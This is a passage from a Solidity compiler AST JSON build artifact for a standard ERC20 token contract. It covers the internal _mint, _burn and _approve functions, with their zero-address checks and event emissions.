																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 848,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 813,
															"src": "5976:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 843,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1084,
														"src": "5946:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 849,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5946:37:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 850,
												"nodeType": "EmitStatement",
												"src": "5941:42:1"
											}
										]
									},
									"documentation": "@dev Creates `amount` tokens and assigns them to `account`, increasing\nthe total supply.\n\n     * Emits a {Transfer} event with `from` set to the zero address.\n\n     * Requirements\n\n     * - `to` cannot be the zero address.",
									"id": 852,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 814,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 811,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 852,
												"src": "5698:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 810,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5698:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 813,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 852,
												"src": "5715:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 812,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5715:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5697:33:1"
									},
									"returnParameters": {
										"id": 815,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5740:0:1"
									},
									"scope": 966,
									"src": "5683:308:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 894,
										"nodeType": "Block",
										"src": "6380:250:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 864,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 860,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 854,
																"src": "6399:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 862,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6418:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 861,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "6410:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 863,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6410:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "6399:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "45524332303a206275726e2066726f6d20746865207a65726f2061646472657373",
															"id": 865,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6422:35:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_b16788493b576042bb52c50ed56189e0b250db113c7bfb1c3897d25cf9632d7f",
																"typeString": "literal_string \"ERC20: burn from the zero address\""
															},
															"value": "ERC20: burn from the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_b16788493b576042bb52c50ed56189e0b250db113c7bfb1c3897d25cf9632d7f",
																"typeString": "literal_string \"ERC20: burn from the zero address\""
															}
														],
														"id": 859,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "6391:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 866,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6391:67:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 867,
												"nodeType": "ExpressionStatement",
												"src": "6391:67:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 873,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 868,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 608,
														"src": "6471:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 871,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 856,
																"src": "6503:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 869,
																"name": "_totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 608,
																"src": "6486:12:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 870,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1145,
															"src": "6486:16:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 872,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "6486:23:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6471:38:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 874,
												"nodeType": "ExpressionStatement",
												"src": "6471:38:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 884,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 875,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "6520:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 877,
														"indexExpression": {
															"argumentTypes": null,
															"id": 876,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 854,
															"src": "6530:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "6520:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 882,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 856,
																"src": "6564:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 878,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "6541:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 880,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 879,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 854,
																	"src": "6551:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "6541:18:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 881,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1145,
															"src": "6541:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 883,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "6541:29:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6520:50:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 885,
												"nodeType": "ExpressionStatement",
												"src": "6520:50:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 887,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 854,
															"src": "6595:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 889,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6612:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 888,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6604:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 890,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6604:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 891,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 856,
															"src": "6616:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 886,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1084,
														"src": "6586:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 892,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6586:36:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 893,
												"nodeType": "EmitStatement",
												"src": "6581:41:1"
											}
										]
									},
									"documentation": "@dev Destroys `amount` tokens from `account`, reducing the\ntotal supply.\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n     * Requirements\n\n     * - `account` cannot be the zero address.\n- `account` must have at least `amount` tokens.",
									"id": 895,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 857,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 854,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 895,
												"src": "6339:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 853,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "6339:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 856,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 895,
												"src": "6356:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 855,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6356:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6338:32:1"
									},
									"returnParameters": {
										"id": 858,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6380:0:1"
									},
									"scope": 966,
									"src": "6324:306:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 936,
										"nodeType": "Block",
										"src": "7144:261:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 909,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 905,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 897,
																"src": "7163:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 907,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7180:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 906,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "7172:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 908,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7172:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "7163:19:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373",
															"id": 910,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7184:38:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208",
																"typeString": "literal_string \"ERC20: approve from the zero address\""
															},
															"value": "ERC20: approve from the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208",
																"typeString": "literal_string \"ERC20: approve from the zero address\""
															}
														],
														"id": 904,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "7155:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 911,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7155:68:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 912,
												"nodeType": "ExpressionStatement",
												"src": "7155:68:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 918,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 914,
																"name": "spender",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 899,
																"src": "7242:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 916,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7261:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 915,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "7253:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 917,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7253:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "7242:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "45524332303a20617070726f766520746f20746865207a65726f2061646472657373",
															"id": 919,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7265:36:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029",
																"typeString": "literal_string \"ERC20: approve to the zero address\""
															},
															"value": "ERC20: approve to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029",
																"typeString": "literal_string \"ERC20: approve to the zero address\""
															}
														],
														"id": 913,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "7234:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 920,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7234:68:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 921,
												"nodeType": "ExpressionStatement",
												"src": "7234:68:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 928,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 922,
																"name": "_allowances",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 606,
																"src": "7315:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 925,
															"indexExpression": {
																"argumentTypes": null,
																"id": 923,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 897,
																"src": "7327:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "7315:18:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 926,
														"indexExpression": {
															"argumentTypes": null,
															"id": 924,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 899,
															"src": "7334:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "7315:27:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 927,
														"name": "value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 901,
														"src": "7345:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7315:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 929,
												"nodeType": "ExpressionStatement",
												"src": "7315:35:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 931,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 897,
															"src": "7375:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 932,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 899,
															"src": "7382:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 933,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 901,
															"src": "7391:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 930,
														"name": "Approval",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1092,
														"src": "7366:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 934,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7366:31:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 935,
												"nodeType": "EmitStatement",
												"src": "7361:36:1"
											}
										]
									},
									"documentation": "@dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n\n     * This is internal function is equivalent to `approve`, and can be used to\ne.g. set automatic allowances for certain subsystems, etc.\n\n     * Emits an {Approval} event.\n\n     * Requirements:\n\n     * - `owner` cannot be the zero address.\n- `spender` cannot be the zero address.",
									"id": 937,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 902,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 897,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 937,
												"src": "7088:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 896,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7088:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 899,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 937,
												"src": "7103:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 898,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7103:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 901,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 937,
												"src": "7120:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 900,
													"name": "uint256",
